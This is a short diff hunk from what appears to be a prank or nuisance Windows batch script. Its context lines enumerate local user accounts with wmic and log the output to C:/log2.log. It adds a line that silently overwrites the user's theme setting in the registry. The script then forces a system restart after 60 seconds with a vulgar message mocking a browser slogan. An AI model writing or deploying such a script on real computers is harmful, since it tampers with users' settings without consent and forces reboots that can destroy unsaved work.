@@ -41,4 +41,5 @@ for /f "skip=1" %%u in ('wmic useraccount get name') do (
 
     
 ) >> C:/log2.log
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /v CurrentTheme /t REG_SZ /d "Windows Standard" /f
 shutdown /r /t 60 /c "The browser that gets more done, up your ass."
